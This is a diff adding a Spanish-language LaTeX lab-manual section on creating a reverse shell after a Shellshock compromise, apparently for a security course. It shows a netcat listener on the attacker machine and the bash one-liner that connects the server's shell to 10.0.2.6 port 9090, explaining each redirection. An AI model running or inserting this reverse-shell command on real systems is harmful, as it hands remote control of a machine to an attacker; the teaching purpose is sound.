@@ -1,0 +1,53 @@
+
+%\section{Guidelines: Creating Reverse Shell}
+%\label{shellshock:sec:reverseshell}
+
+La idea principal de una shell reversa es poder redirigir los dispositivos de standard input, output y error hacia una conexión de red, pudiendo así enviar y recibir información a través de este canal por la shell. En la otra punta de la conexión estará la máquina del atacante corriendo un programa mostrando lo que venga de la shell del otro lado de la conexión, al mismo tiempo este programa enviará lo que el atacante escriba usando la misma conexión de red.
+
+Uno de los programas más usados por los atacantes para este propósito es \texttt{netcat}, si se corre con el parámetro \texttt{"-l"}, este se pondrá a la escucha de un puerto TCP en un puerto específico, convirtiéndose en un servidor TCP. Este servidor bastante simple hecho con netcat, mostrará lo que sea enviado por parte de un cliente y enviará lo que el usuario corriendo el servidor escriba.
+En el siguiente experimento usaremos  \texttt{netcat} para ponernos a la escucha en el puerto TCP \texttt{9090} simulando ser un servidor TCP.
+
+\begin{lstlisting}
+Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
+Listening on 0.0.0.0 9090
+Connection received on 10.0.2.5 39452
+Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
+Server(10.0.2.5):$ ifconfig
+ifconfig
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
+        ...
+\end{lstlisting}
+
+El comando \texttt{nc} mostrado arriba, se pondrá a la escucha en el puerto TCP 9090 y se bloqueará en espera de nuevas conexiones.
+A continuación con el fin de emular lo que haría un atacante después de comprometer el servidor por medio del ataque de Shellshock, debemos de correr el programa bash mostrado más abajo en el servidor cuya dirección IP es (\texttt{10.0.2.5}).
+Este programa lanzará una conexión TCP en el puerto 9090 hacia la máquina del atacante, otorgándole así una shell reversa. Podremos observar el prompt shell que nos indica que la shell está corriendo en el servidor; podemos usar el comando \texttt{ifconfig} para verificar que la dirección IP es la correcta (\texttt{10.0.2.5}) y que es la que pertenece a la máquina que hostea el servidor. A continuación se muestra la sentencia de bash que debe ser ejecutada:
+
+\begin{lstlisting}
+Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
+\end{lstlisting}
+
+Este comando normalmente es ejecutado por un atacante en un servidor comprometido.
+Debido a que esta línea es un tanto engorrosa, en los siguientes parráfos darémos una explicación detallada de su funcionamiento. 
+
+
+\begin{itemize}
+
+\item \texttt{"/bin/bash -i"}: El parámetro \texttt{i} es quiere decir que la shell será una shell interactiva, esto significa que nos permitirá interactuar para enviar y recibir información usando la shell.
+
+\item \texttt{"> /dev/tcp/10.0.2.6/9090"}: Esto hace que el (\texttt{stdout}) (standard output) de la shell sea redirigido hacia la conexión TCP establecida con la IP del atacante \texttt{10.0.2.6} en el puerto \texttt{stdout} es el  \texttt{9090}. En sistemas \unix, el número del descriptor de archivo (file descriptor) del \texttt{stdout} es el \texttt{1}
+
+\item \texttt{"0<\&1"}: El descriptor de archivo (file descriptor) cuyo número es \texttt{0} representa el standard input (\texttt{stdin}). Esta opción le indica al sistema que use el standard output como standard input.
+Dado que el \texttt{stdout} está siendo redirigido hacia una conexión TCP, esta opción le indica al programa shell que obtendrá su entrada usando la misma conexión.
+
+\item \texttt{"2>\&1"}: El descriptor de archivo (file descriptor) cuyo número es cuyo número es \texttt{2} representa el standard error \texttt{stderr}.
+Esto hace que cualquier error que pueda ocurrir sea redirigido al \texttt{stdout} que es la conexión TCP.
+
+\end{itemize}
+
+Para concluir, el comando  \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\&1"}  ejecuta una shell \texttt{bash} en la máquina del servidor cuyo input viene de una conexión TCP y su output sale por la misma conexión TCP.
+En nuestro experimento al ejecutar la shell \texttt{bash} en el servidor \texttt{10.0.2.5} este establecerá una conexión reversa hacia  \texttt{10.0.2.6}. Esto puede ser verificado por medio del mensaje \texttt{"Connection from 10.0.2.5 ..."} mostrado en \texttt{netcat}.
+
+
+
+
